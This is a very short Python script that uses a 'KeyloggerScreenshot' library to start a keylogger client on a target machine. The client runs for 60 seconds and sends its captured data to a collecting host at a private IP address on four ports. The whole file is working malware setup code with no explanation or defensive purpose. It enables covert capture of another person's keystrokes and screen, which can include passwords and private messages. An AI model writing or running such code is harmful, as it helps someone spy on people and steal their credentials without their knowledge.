import KeyloggerScreenshot as ks 

ip = '192.168.0.75'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333, ip, 4444, duration_in_seconds=60, phishing_web=None)
key_client.start()
